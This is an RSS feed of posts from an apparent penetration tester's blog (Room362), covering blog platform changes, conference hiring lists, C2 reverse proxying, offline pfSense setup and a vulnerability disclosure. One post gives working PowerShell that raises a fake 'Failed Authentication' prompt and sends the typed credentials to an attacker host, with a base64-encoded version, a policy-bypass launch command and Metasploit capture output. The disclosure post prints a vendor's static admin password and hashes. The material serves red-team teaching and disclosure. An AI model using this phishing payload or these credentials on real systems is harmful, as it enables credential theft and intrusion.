<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Room362</title>
    <link>http://room362.com/</link>
    <description>Recent content on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Sat, 26 Mar 2016 13:43:09 -0400</lastBuildDate>
    <atom:link href="http://room362.com/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>another blogging platform</title>
      <link>http://room362.com/post/2016/03-26-another-blogging-platform/</link>
      <pubDate>Sat, 26 Mar 2016 13:43:09 -0400</pubDate>
      
      <guid>http://room362.com/post/2016/03-26-another-blogging-platform/</guid>
      <description>&lt;p&gt;Yes yes yes, I know, another platform, but guess what, it&amp;rsquo;s my blog, so ne-ner-ne-ner-ne-ner&lt;/p&gt;

&lt;p&gt;Hugo removed what I didn&amp;rsquo;t like about Octopress (the generating / pushing of content using a mix of branches and such)&lt;/p&gt;

&lt;p&gt;The reason I moved from Blogger was I just can&amp;rsquo;t stand having to log in and be online to make posts. I love things like MarsEdit for doing offline posts to services like Blogger, but I never could get the formatting right when I was done, especiall for code, so I&amp;rsquo;m back to a markdown based system. Mostly because I like how it displays code (yes yes I know you can add highlightjs to blogger too)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://gohugo.io/&#34;&gt;&lt;img src=&#34;http://room362.com/images/2016/hugo.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2016 Shmoocon Hiring List</title>
      <link>http://room362.com/post/2016/01-04-2016-shmoocon-hiring-list/</link>
      <pubDate>Mon, 04 Jan 2016 11:30:44 -0500</pubDate>
      
      <guid>http://room362.com/post/2016/01-04-2016-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2016 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;http://goo.gl/forms/pbYI0TZ9dG&#34;&gt;http://goo.gl/forms/pbYI0TZ9dG&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/&#34;&gt;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;1200&#34; src=&#34;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34; width=&#34;900&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>reverse proxying attacker tools</title>
      <link>http://room362.com/post/2015/12-31-reverse-proxying-attacker-tools/</link>
      <pubDate>Thu, 31 Dec 2015 16:28:07 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/12-31-reverse-proxying-attacker-tools/</guid>
      <description>

&lt;p&gt;Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google?&lt;/p&gt;

&lt;p&gt;Nginx makes that possible, and instead of making a blog post that will disappear, I&amp;rsquo;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://attackerkb.com/Combinations/ReverseProxyAttackTools&#34;&gt;https://attackerkb.com/Combinations/ReverseProxyAttackTools&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;and instead, show you the results once it&amp;rsquo;s setup:&lt;/p&gt;

&lt;h3 id=&#34;metasploit:6f3acd67b5d323fe904358e46aa9ef3c&#34;&gt;Metasploit:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;empire:6f3acd67b5d323fe904358e46aa9ef3c&#34;&gt;Empire:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Back to Blogger</title>
      <link>http://room362.com/post/2015/back-to-blogger/</link>
      <pubDate>Mon, 07 Sep 2015 07:35:28 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/back-to-blogger/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve had my fare share of &amp;ldquo;trying new things&amp;rdquo; after &lt;a href=&#34;http://www.squarespace.com&#34;&gt;SquareSpace&lt;/a&gt;. I tried &lt;a href=&#34;http://ghost.org&#34;&gt;Ghost&lt;/a&gt;, &lt;a href=&#34;http://octopress.org/&#34;&gt;Octopress&lt;/a&gt;, &lt;a href=&#34;http://wordpress.com&#34;&gt;Wordpress&lt;/a&gt;, and about 30 others in between. All the blogging platforms I tried had some major issues that I didn&amp;rsquo;t like. I&amp;rsquo;m sure at some point I&amp;rsquo;ll write about them but this post is mostly just to announce I &lt;em&gt;finally&lt;/em&gt; have given up the fight for finding the perfect blogging platform and I&amp;rsquo;m just going to blog on Blogger from now on. One of the main reasons for just giving in was the fact that I noticed that because I was doing conversion of 500+ blog posts every time I wanted to switch platforms I was constantly &amp;ldquo;not in the mood&amp;rdquo; to blog, which kinda negates the whole purpose of finding a new platform. Anywho, rant over. I should be back on the clock now, hopefully bringing cool stuff here in the weeks and months to come.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>pfSense without Internets</title>
      <link>http://room362.com/post/2015/pfsense-without-internets/</link>
      <pubDate>Tue, 17 Feb 2015 12:11:28 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/pfsense-without-internets/</guid>
      <description>&lt;p&gt;A while back I needed to set up a pfSense box for CTF/example stuff that didn&amp;rsquo;t and wouldn&amp;rsquo;t ever have Internet connectivity. Doesn&amp;rsquo;t seem like much of a task right? Just pop it in and go. Problem is that you loose the use of the packages that help make pfSense so awesome.&lt;/p&gt;

&lt;p&gt;Once I figured it out at that time, I made a Forum post so that anyone running into the same issue wouldn&amp;rsquo;t have to struggle as much:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://forum.pfsense.org/index.php?topic=55504.0&#34;&gt;https://forum.pfsense.org/index.php?topic=55504.0&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Most things never disappear from the Internet but I was looking for an old forum post I had bookmarked regarding some persistence methods that I noticed was no longer there since the forum owner had gotten rid of the forum as too much hassle. I get it, but when I went to Archive.org to get saved they didn&amp;rsquo;t have a copy. So this is what this post is for, to save that content just in case it disappears.&lt;/p&gt;

&lt;p&gt;Also, here is a bug report for the &amp;ldquo;issue&amp;rdquo; (been open since 2012):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://redmine.pfsense.org/issues/2586&#34;&gt;http://redmine.pfsense.org/issues/2586&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you are following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://doc.pfsense.org/index.php/Creating_Your_Own_Package_Repository&#34;&gt;http://doc.pfsense.org/index.php/Creating_Your_Own_Package_Repository&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and you are getting:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Unable to communicate with 192.168.1.100 Please verify DNS and interface configuration, and that pfSense has functional Internet connectivity.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;because you are using the repo to enable a offline (non internet connected) host to be able to utilize packages all you have to do is:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Go into Services -&amp;gt; DNS Forwarder and add a Host Override&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Host: www
Domain: pfsense.org
IP Address: 127.0.0.1
Description: null routed record to enable offline repo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then make sure you have the IP or hostname of your package repository web server in the &lt;code&gt;/pkg_mgr_settings.php&lt;/code&gt; (on 2.0, follow the guidelines on the doc above for older versions). After that you should be good to go. Of course this is barring any Firewall blockages you might have in place so be sure to test connectivity from the pfSense box to the web server.&lt;/p&gt;

&lt;p&gt;So, that was just the beginning, it&amp;rsquo;s actually better to not null-route it but make the following entries:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;files.pfsense.org - 192.168.1.100
files.pfsense.com - 192.168.1.100
www.pfsense.org - 192.168.1.100
www.pfsense.com - 192.168.1.100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If your package web server is 192.168.1.100.
Next is the problem of not having the packages themselves. So &lt;code&gt;wget -mk -np http://files.pfsense.org/packages/&lt;/code&gt; gave me a directory that I plopped into my already existant packages directory (created from the git clone as described in the documentation) but the problem I ran into was the php files being rendered still (which made any packages that pulled php files get the rendered version instead of source).&lt;/p&gt;

&lt;p&gt;So you need to add a &lt;code&gt;.htaccess&lt;/code&gt; file in the packages directory with the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;RemoveHandler .php .phtml .php3
RemoveType .php .phtml .php3
php_flag engine off
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Make sure that &lt;code&gt;AllowOverride all&lt;/code&gt; is enabled if you are running Apache to host the package site, if not, you&amp;rsquo;ll have to google how to allow &lt;code&gt;.htaccess&lt;/code&gt; files for your particular server. (or if you server doesn&amp;rsquo;t support htaccess files then how to enable source disclosure)&lt;/p&gt;

&lt;p&gt;After those alterations I seem to be off to the races for the most part. Some packages pull from other websites, but altering the &lt;code&gt;package_8.xml&lt;/code&gt; or just rerouting the dns seems to solve most of those issues.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2015 ShmooCon Hiring</title>
      <link>http://room362.com/post/2015/2015-shmoocon-hiring/</link>
      <pubDate>Tue, 13 Jan 2015 10:55:08 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/2015-shmoocon-hiring/</guid>
      <description>&lt;p&gt;It&amp;rsquo;s often tough from both hiring and job hunters to find one another at conferences. I think this is mostly because of a couple things.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;No one wants to stand at a both on either side and talk job stuff in front of a bunch of people and people at booths rarely get the chance to get away.&lt;/li&gt;
&lt;li&gt;It&amp;rsquo;s hard to know &amp;ldquo;who&amp;rdquo; to talk to.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So I created a very simple Google doc to help put twitter handles and links together for people who are job hunting and people who are hiring to kinda get to know who to talk to.&lt;/p&gt;

&lt;p&gt;Got more to add? Please let me know and I&amp;rsquo;ll get it added, or simply make a comment on the Google doc with the info to add&lt;/p&gt;

&lt;iframe width=100% height=1200 src=&#34;https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/pubhtml?widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;

&lt;p&gt;Link to the doc is here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/edit?usp=sharing&#34;&gt;https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/edit?usp=sharing&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hope this helps,&lt;/p&gt;

&lt;p&gt;Rob&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Powershell Popups &#43; Capture</title>
      <link>http://room362.com/post/2015/powershell-popups-and-capture/</link>
      <pubDate>Mon, 12 Jan 2015 17:52:10 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/powershell-popups-and-capture/</guid>
      <description>&lt;p&gt;Metasploit Minute has entered into it&amp;rsquo;s 3rd &amp;ldquo;season&amp;rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)&lt;/p&gt;

&lt;p&gt;Here is the video:&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/H_E3FNF8rBw&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;Here is the code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName + &amp;quot;\&amp;quot; + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets break down the code line by line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserName,[Environment]::UserDomainName);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This tells windows to prompt for credentials, with the title of &amp;ldquo;Failed Authentication&amp;rdquo;, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc = new-object net.webclient;
$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creates a new webclient object and sets its user agent to &amp;lsquo;wget&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat power.txt | iconv --to-code UTF-16LE | base64

JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then execute &lt;code&gt;powershell -ep bypass -enc &amp;lt;the encoded text from above&amp;gt;&lt;/code&gt; and you get this:&lt;/p&gt;

&lt;p&gt;Image should be here: &lt;img src=&#34;http://room362.com/images/2015/powershellpopup.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/metasploit-framework# ./msfconsole -Lq
msf &amp;gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &amp;gt; show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you&#39;d like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                       no        The URI to use for this exploit (default is random)

msf auxiliary(http_basic) &amp;gt; set SSL true
SSL =&amp;gt; true
msf auxiliary(http_basic) &amp;gt; set SRVPORT 443
SRVPORT =&amp;gt; 443
msf auxiliary(http_basic) &amp;gt; set URIPATH /
URIPATH =&amp;gt; /
msf auxiliary(http_basic) &amp;gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &amp;gt;
[*] Listening on 0.0.0.0:443...
[*] Using URL: https://0.0.0.0:443/
[*]  Local IP: https://172.16.102.163:443/
[*] Server started.
[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
[+] 172.16.102.140 - Credential collected: &amp;quot;SITTINGDUCK\user:ASDqwe123&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Game over!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Full Disclosure - SingleClick Connect</title>
      <link>http://room362.com/post/2014/full-disclosure-singleclick-connect/</link>
      <pubDate>Mon, 15 Sep 2014 11:26:38 -0500</pubDate>
      
      <guid>http://room362.com/post/2014/full-disclosure-singleclick-connect/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: I originally posted this to the Full Disclosure mailing list but for some reason it wasn&amp;rsquo;t accepted via the moderator so I&amp;rsquo;m posting it here. First, so that the information does get out there, and second to see if anyone knows why it may have been rejected.&lt;/p&gt;

&lt;p&gt;I was helping out a family member with their computer when it came up that they &amp;ldquo;already had remote help software&amp;rdquo; (SingleClickConnect or SCC), when I asked what this was, the family member said it was installed by Dell Support when trying to fix their issue. This was in 2008. I removed it, and helped to fix the issue.&lt;/p&gt;

&lt;p&gt;In 2010 another issue arose on the new computer (Dell again) of the same family member. Again, calling support first they had installed this software.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: I can not say for certain that it was Dell&amp;rsquo;s support rep, or even that it was them that installed it, but if Dell is using this as a means of support they should probably cease for the following reasons:&lt;/p&gt;

&lt;p&gt;Apache (port 40080) listening 0.0.0.0, MySQL (port 17771) listening 127.0.0.1, PHP, and UltraVNC (5900) are installed as a part of the software package.&lt;/p&gt;

&lt;h2 id=&#34;issue-1:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #1&lt;/h2&gt;

&lt;p&gt;Without decoding the ionCube &amp;ldquo;copyright protecting&amp;rdquo; software a large number of XSS, CSRF, and SQLi vulnerabilities were found, all unauthenticated to the web app that runs there.&lt;/p&gt;

&lt;p&gt;No specifics are being posted on these vulnerabilities as I assume the site on the net (company&amp;rsquo;s site), where a registered user would log in are the same as the ones locally hosted (at least the app looks the same and has similar page structure)&lt;/p&gt;

&lt;h2 id=&#34;issue-2:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #2&lt;/h2&gt;

&lt;p&gt;MySQL&amp;rsquo;s root password is blank and there are two other default accounts as well allowing easy privilege escalation to SYSTEM (via the SCC local account - see ISSUE #5):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dsl *7E1CA3417E3A159A9188657F44C7034A8E9FDFF2
tera *B2744A6BC5E8B1667BE5AED0111A2B941356E4A4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;^ uncracked at this point. For all I know they could be randomized at install&lt;/p&gt;

&lt;h2 id=&#34;issue-3:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #3&lt;/h2&gt;

&lt;p&gt;Another service listens on 0.0.0.0 via port 17667 that I haven&amp;rsquo;t been able to identify, however when you connect to the socket, it starts listing users, services, printers and interfaces (and that is without sending any data to it).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ncat 172.16.102.149 17667
8�TXPBASELINEXP_BASEP�RAdministratorGuestHelpAssistantSingleClick
AdminSUPPORT_388945a0!aCACAMD PCNET Family PCI Ethernet Adapter -
Packet Scheduler Miniport{47F69AAC-AE9A-40A9-88F5-A246A169CE92}�f�
)�n�����f�f��fDownloadsC:\Documents and Settings\Administrator\My
Documents\DownloadsMicrosoft XPS Document
WriterXPSPortprinter#:2TPVM#:1TPVMACDWindows FirewallMicrosoftCreative
Sound Blaster PCI
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;issue-4:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #4&lt;/h2&gt;

&lt;p&gt;When UltraVNC is installed, it uses the same password as the one for your &amp;lsquo;registered&amp;rsquo; account (just password auth) and listens on 0.0.0.0. It is easily to decrypt from the UltraVNC.ini that is located in &lt;code&gt;%ApplicationData%&lt;/code&gt; for the user&lt;/p&gt;

&lt;h2 id=&#34;issue-5:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #5&lt;/h2&gt;

&lt;p&gt;A local account called &amp;ldquo;SingleClick Admin&amp;rdquo; is installed with a static
password and added to the Administrators group. 3 services are also
installed with the SingleClick Admin account as the user it runs
under:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Package d&#39;authentification  : NTLM
Utilisateur principal       : SingleClick Admin
     msv1_0 :     lm{ 7a9793d3082ba83b790ce07b3bdf85ea }, ntlm{ 2c292724d67fcf310d1c4dd153467be8 }
     kerberos :     ~!3no1972!~
     ssp :
     wdigest :     ~!3no1972!~


 8. Name         : _SC_Apache2.2
 8. Service      : .\SingleClick Admin
 8. Current      : ~!3no1972!~

 9. Name         : _SC_dsl-fs-sync
 9. Service      : .\SingleClick Admin
 9. Current      : ~!3no1972!~
 9. Old          : ~!3no1972!~

10. Name         : _SC_hnmsvc
10. Service      : .\SingleClick Admin
10. Current      : ~!3no1972!~
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;concern-1:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #1&lt;/h2&gt;

&lt;p&gt;As far as I can tell the software continuously scans you local network for other computers and file system for changes and reports these back to the central server so that when you login to their service you can see your files and connect to other systems in the LAN of the machine SingleClickConnect is installed on.&lt;/p&gt;

&lt;h2 id=&#34;concern-2:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #2&lt;/h2&gt;

&lt;p&gt;The user account password that you use to register and connect remotely is stored in the database. This actually looks decently done, or I just haven&amp;rsquo;t been able to identify the storage&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Database: p2p
Table:    config_info
Value:    “user_hash”
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;concern-3:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #3&lt;/h2&gt;

&lt;p&gt;Not sure what this registry key contains other than being named Cred4RA and assuming it&amp;rsquo;s credentials for the remote administration. Hopefully encrypted some how.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\SingleClick Systems\Advanced Networking
Service\Settings\Remote Access]
&amp;quot;ConfigState&amp;quot;=dword:00000001
&amp;quot;Cred4RA&amp;quot;=hex:01,00,00 (snip snip)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;additional-information:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;Additional Information&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Software original site: &lt;a href=&#34;http://www.singleclickconnect.com/&#34;&gt;http://www.singleclickconnect.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Current site: &lt;a href=&#34;http://www.vivedriveconnect.com/&#34;&gt;http://www.vivedriveconnect.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Direct download of software (for home use): &lt;a href=&#34;http://downloads.vivedriveconnect.com/scc_setup.exe&#34;&gt;http://downloads.vivedriveconnect.com/scc_setup.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;vendor-contact:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;Vendor Contact&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Email sent in &lt;strong&gt;2010 July&lt;/strong&gt; about issues 1 - 5

&lt;ul&gt;
&lt;li&gt;No reply, and forgot about until 2013 when the software was
mentioned by a friend (if I had ever heard of it)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2013 April&lt;/strong&gt; - Email sent again, forwarding original, bounced back as
account unknown&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2014 August&lt;/strong&gt; - Accidentally found notes while searching for
something else, attempted to relocate the software via Archive.org
with the feeling that the site had gone away and happened upon the new
site,, downloaded software, confirmed issues, and forwarded the email
to the new point of contact at the new domain. No response.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2014 September&lt;/strong&gt;, Full disclosure.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Dell&amp;hellip; If your techs do actually use this software for support (I
hope not) in any form or fashion, you are putting each one of them at
a pretty high risk.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OSX Persistence via PHP Webshell</title>
      <link>http://room362.com/post/2014/2014-09-09-osx-persistence-via-php-webshell/</link>
      <pubDate>Tue, 09 Sep 2014 15:25:27 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-09-09-osx-persistence-via-php-webshell/</guid>
